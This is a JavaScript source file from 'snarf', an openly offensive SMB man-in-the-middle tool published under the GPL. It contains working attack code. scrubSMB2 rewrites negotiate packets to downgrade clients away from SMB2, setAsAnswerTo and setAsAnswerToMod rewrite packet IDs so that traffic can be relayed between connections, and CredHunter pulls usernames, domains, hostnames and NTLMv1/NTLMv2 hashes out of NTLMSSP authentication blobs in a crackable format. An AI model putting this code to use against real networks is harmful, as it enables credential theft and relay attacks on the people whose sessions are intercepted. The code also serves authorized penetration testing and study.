//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
//                    Victor Mata (victor@offense-in-depth.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var util = require("util");
var out = require("./out.js");

var commands = {
    0x00 : "SMB_COM_CREATE_DIRECTORY",
    0x01 : "SMB_COM_DELETE_DIRECTORY",
    0x02 : "SMB_COM_OPEN",
    0x03 : "SMB_COM_CREATE",
    0x04 : "SMB_COM_CLOSE",
    0x05 : "SMB_COM_FLUSH",
    0x06 : "SMB_COM_DELETE",
    0x07 : "SMB_COM_RENAME",
    0x08 : "SMB_COM_QUERY_INFORMATION",
    0x09 : "SMB_COM_SET_INFORMATION",
    0x0A : "SMB_COM_READ",
    0x0B : "SMB_COM_WRITE",
    0x0C : "SMB_COM_LOCK_BYTE_RANGE",
    0x0D : "SMB_COM_UNLOCK_BYTE_RANGE",
    0x0E : "SMB_COM_CREATE_TEMPORARY",
    0x0F : "SMB_COM_CREATE_NEW",
    0x10 : "SMB_COM_CHECK_DIRECTORY",
    0x11 : "SMB_COM_PROCESS_EXIT",
    0x12 : "SMB_COM_SEEK",
    0x13 : "SMB_COM_LOCK_AND_READ",
    0x14 : "SMB_COM_WRITE_AND_UNLOCK",
    0x1A : "SMB_COM_READ_RAW",
    0x1B : "SMB_COM_READ_MPX",
    0x1C : "SMB_COM_READ_MPX_SECONDARY",
    0x1D : "SMB_COM_WRITE_RAW",
    0x1E : "SMB_COM_WRITE_MPX",
    0x1F : "SMB_COM_WRITE_MPX_SECONDARY",
    0x20 : "SMB_COM_WRITE_COMPLETE",
    0x21 : "SMB_COM_QUERY_SERVER",
    0x22 : "SMB_COM_SET_INFORMATION2",
    0x23 : "SMB_COM_QUERY_INFORMATION2",
    0x24 : "SMB_COM_LOCKING_ANDX",
    0x25 : "SMB_COM_TRANSACTION",
    0x26 : "SMB_COM_TRANSACTION_SECONDARY",
    0x27 : "SMB_COM_IOCTL",
    0x28 : "SMB_COM_IOCTL_SECONDARY",
    0x29 : "SMB_COM_COPY",
    0x2A : "SMB_COM_MOVE",
    0x2B : "SMB_COM_ECHO",
    0x2C : "SMB_COM_WRITE_AND_CLOSE",
    0x2D : "SMB_COM_OPEN_ANDX",
    0x2E : "SMB_COM_READ_ANDX",
    0x2F : "SMB_COM_WRITE_ANDX",
    0x30 : "SMB_COM_NEW_FILE_SIZE",
    0x31 : "SMB_COM_CLOSE_AND_TREE_DISC",
    0x32 : "SMB_COM_TRANSACTION2",
    0x33 : "SMB_COM_TRANSACTION2_SECONDARY",
    0x34 : "SMB_COM_FIND_CLOSE2",
    0x35 : "SMB_COM_FIND_NOTIFY_CLOSE",
    0x70 : "SMB_COM_TREE_CONNECT",
    0x71 : "SMB_COM_TREE_DISCONNECT",
    0x72 : "SMB_COM_NEGOTIATE",
    0x73 : "SMB_COM_SESSION_SETUP_ANDX",
    0x74 : "SMB_COM_LOGOFF_ANDX",
    0x75 : "SMB_COM_TREE_CONNECT_ANDX",
    0x7E : "SMB_COM_SECURITY_PACKAGE_ANDX",
    0x80 : "SMB_COM_QUERY_INFORMATION_DISK",
    0x81 : "SMB_COM_SEARCH",
    0x82 : "SMB_COM_FIND",
    0x83 : "SMB_COM_FIND_UNIQUE",
    0x84 : "SMB_COM_FIND_CLOSE",
    0xA0 : "SMB_COM_NT_TRANSACT",
    0xA1 : "SMB_COM_NT_TRANSACT_SECONDARY",
    0xA2 : "SMB_COM_NT_CREATE_ANDX",
    0xA4 : "SMB_COM_NT_CANCEL",
    0xA5 : "SMB_COM_NT_RENAME",
    0xC0 : "SMB_COM_OPEN_PRINT_FILE",
    0xC1 : "SMB_COM_WRITE_PRINT_FILE",
    0xC2 : "SMB_COM_CLOSE_PRINT_FILE",
    0xC3 : "SMB_COM_GET_PRINT_QUEUE",
    0xD8 : "SMB_COM_READ_BULK",
    0xD9 : "SMB_COM_WRITE_BULK",
    0xDA : "SMB_COM_WRITE_BULK_DATA",
    0xFE : "SMB_COM_INVALID",
    0xFF : "SMB_COM_NO_ANDX_COMMAND"
}

function scrubSMB2(buffer) {
    var len = buffer.readUInt16LE(37)+40-2;
    var buf = buffer.slice(40, len);

    for(var i=40; i < len - 5; i++) {
        var test = buffer.toString("utf8", i, i+5);
        if(test == "SMB 2") {
            out.red("Scrubbing SMB2 dialect");
            buffer.write("BOGUS", i);
        }
    }
}

function SMBEchoRequest() {
    // place-holder for "SMB Echo Request" packet structure and content
    // may include arguments for tree_id, user_id, process_id, or other SMB headers

    var packet = "\x00\x00\x00";                  // NetBIOS Header
    packet += "\x35";                             // <LENGTH>
    packet += "\xff\x53\x4d\x42";                 // Server Component: SMB
    packet += "\x2b";                             // SMB Command: Echo (0x2b)
    packet += "\x00";                             // Error Class: Success (0x00)
    packet += "\x00";                             // Reserved
    packet += "\x00\x00";                         // Error Code
    packet += "\x00";                             // Flags
    packet += "\x00\x00";                         // Flags2
    packet += "\x00\x00";                         // Process ID High
    packet += "\x00\x00\x00\x00\x00\x00\x00\x00"; // Signature
    packet += "\x00\x00";                         // Reserved
    packet += "\x00\x00";                         // Tree ID
    packet += "\x00\x00";                         // Process ID
    packet += "\x00\x00";                         // User ID
    packet += "\x00\x00";                         // Multiplex ID
    //
    packet += "\x01";                             // Word Count (WCT): 1
    packet += "\x01\x00";                         // Echo Count: 1
    packet += "\x10\x00";                         // Byte Count (BCC): 16
    packet += "\xf0\xf0\xf0\xf0\xf0\xf0\xf0\xf0"; // Echo Data
    packet += "\xf0\xf0\xf0\xf0\xf0\xf0\xf0\xf0"; // Echo Data

    var buf = new Buffer(packet, 'binary');
    return buf
}

function SMBPacket(buffer) {
    var base = 4;
    var myself = this;

    this.length = buffer.readUInt8(1) << 16 | buffer.readUInt16BE(2);
    this.buffer = buffer;
    this.commandCode = buffer.readUInt8(base+4);

    if(commands[this.commandCode]) {
        this.command = commands[this.commandCode];
    } else {
        this.command = "0x" + this.commandCode.toString(16) + " : unknown";
    }

    if(this.commandCode == 0x72) {
        var len       = buffer.readUInt16LE(37)+40-2;
        var diabuffer = buffer.slice(40, len).toString();
        var dialects  = diabuffer.split(/\x00\x02/);
        this.ntlmoffset = dialects.indexOf("NT LM 0.12");
        scrubSMB2(buffer);

        // out.red("NT LM 0.12 offset is " + this.ntlmoffset);
        // buffer.writeUInt16LE(12, 37);
        // buffer.writeUInt8(0x02, 39);
        // buffer.write("NT LM 0.12", 40);
        // buffer.writeUInt8(0x00, 50);
    }

    if(this.commandCode == 0x73) {
	this.status = buffer.readUInt32LE(base + 5);
    }

    this.describe = function() {
        return util.format("SMB (%d bytes), CMD: %s", this.length, this.command);
    }

    // A few SMB details intrude on reusing packets from one
    // connection to another.  If someone is making multiple
    // connections, we need to make sure that process IDs and
    // multiplex IDS match.

    this.setAsAnswerTo = function(packet) {
        var processid = packet.buffer.readUInt16LE(30);
        var flags     = packet.buffer.readUInt8(13) | 0x80; // 0x80 makes it a "response"
        var flags2    = packet.buffer.readUInt16LE(14);
        var mid       = packet.buffer.readUInt16LE(34);
        var dlen      = packet.buffer.readUInt16LE(37);

        this.buffer.writeUInt8(flags, 13);
        this.buffer.writeUInt16LE(flags2, 14);
        this.buffer.writeUInt16LE(processid, 30);
        this.buffer.writeUInt16LE(mid, 34);

        // If different clients specify different authentication dialects,
        // then we might end up with a mismatch.  In SMB_COM_NEGOTIATE
        // responses, we need to make sure we choose the same one.  In
        // testing so far, they always seem to choose the last one.  This
        // may not always be the case, and could require enhancing in the
        // future.

        if(packet.commandCode == 0x72) {

            // we add len to 40 (the offset for the dialect list), and then
            // subtract two because the two bytes used to specify the length
            // count.  In later NodeJS versions, the overrun is fine, but
            // older versions throw an exception.

            var len       = packet.buffer.readUInt16LE(37)+40-2;
            var dialects  = packet.buffer.slice(40, len).toString();
            var lastd     = dialects.split(/\x00\x02/);
            //out.red("Patching dialect (" + (lastd.length-1) + ")");
            //this.buffer.writeUInt16LE(lastd.length-1, 37);
            out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
            this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
        }
        return true;
    }

    this.setAsAnswerToMod = function(packet, uid) {
        var processid = packet.buffer.readUInt16LE(30);
        var flags     = packet.buffer.readUInt8(13) | 0x80; // 0x80 makes it a "response"
        var flags2    = packet.buffer.readUInt16LE(14);
        var mid       = packet.buffer.readUInt16LE(34);
        var dlen      = packet.buffer.readUInt16LE(37);

        this.buffer.writeUInt8(flags, 13);
        this.buffer.writeUInt16LE(flags2, 14);
        this.buffer.writeUInt16LE(processid, 30);
        this.buffer.writeUInt16LE(uid, 32);
        this.buffer.writeUInt16LE(mid, 34);

        if(packet.commandCode == 0x72) {

            var len       = packet.buffer.readUInt16LE(37)+40-2;
            var dialects  = packet.buffer.slice(40, len).toString();
            var lastd     = dialects.split(/\x00\x02/);
            //out.red("Patching dialect (" + (lastd.length-1) + ")");
            //this.buffer.writeUInt16LE(lastd.length-1, 37);
            out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
            this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
        }
        return true;
    }


}

function CredHunter(packet) {
    this.domain = "unknown";
    this.username = "unknown";
    this.hostname = "unknown";
    this.winver = "unknown";
    this.challenge = "unknown";
    this.hash = "unknown";
    this.htype = "unknown";
    this.ntlmssp  = false;
    try {
        var header  = packet.slice(4,36);
        var bloblen = packet.readUInt16LE(36+15);
        var secblob = packet.slice(36+27, 36+27+bloblen);

        // NTLMSSP
        for(var i = 0; i < secblob.length - 7; i++) {
            if(secblob.toString('utf8', i, i+7) == "NTLMSSP") {
                this.ntlmssp = true;
                this.ntlmssp_offset = i + 4 + 36 + 27;
                var authtype = secblob.readUInt32LE(i+8);
                if(authtype == 3) {
                    var lmlen = secblob.readUInt16LE(i+12);
                    var lmoff = secblob.readUInt32LE(i+16);
                    var ntlmlen = secblob.readUInt16LE(i+20);
                    var ntlmoff = secblob.readUInt32LE(i+24);
                    var domlen = secblob.readUInt16LE(i+28);
                    var domoff = secblob.readUInt32LE(i+32);
                    var userlen = secblob.readUInt16LE(i+36);
                    var useroff = secblob.readUInt32LE(i+40);
                    var hostlen = secblob.readUInt16LE(i+44);
                    var hostoff = secblob.readUInt32LE(i+48);
                    var win_major_ver = secblob.readUInt8(i+64);
                    var win_minor_ver = secblob.readUInt8(i+65);
                    var win_build_ver = secblob.readUInt16LE(i+66);

                    var username = secblob.toString('utf8', i+useroff, i+useroff+userlen);
                    var lmhash = secblob.toString('hex', i+lmoff, i+lmoff+lmlen);
                    var nthash = secblob.toString('hex', i+ntlmoff, i+ntlmoff+ntlmlen);

                    // we must remove the null bytes in the domain and username
                    this.domain = secblob.toString('utf8', i+domoff, i+domoff+domlen).replace(/\0/g, '');
                    this.username = secblob.toString('utf8', i+useroff, i+useroff+userlen).replace(/\0/g, '');
                    this.hostname = secblob.toString('utf8', i+hostoff, i+hostoff+hostlen);
                    this.winver = "Windows " + win_major_ver + "." + win_minor_ver + " (Build " + win_build_ver + ")"

                    if(ntlmlen == 24) {
                        // NTLMv1
                        this.hash = lmhash + ":" + nthash;
                        this.htype = "NTLMv1";
                    } else {
                        // NTLMv2
                        this.hash = nthash.slice(0,32) + ":" + nthash.slice(32);
                        this.htype = "NTLMv2";
                    }
                } else if(authtype == 2) {
                    this.challenge = secblob.toString('hex', i+24, i+32);
                }
            }
        }
    } catch(e) {
    }
}

module.exports.CredHunter = CredHunter;
module.exports.SMBPacket = SMBPacket;
module.exports.SMBEchoRequest = SMBEchoRequest;
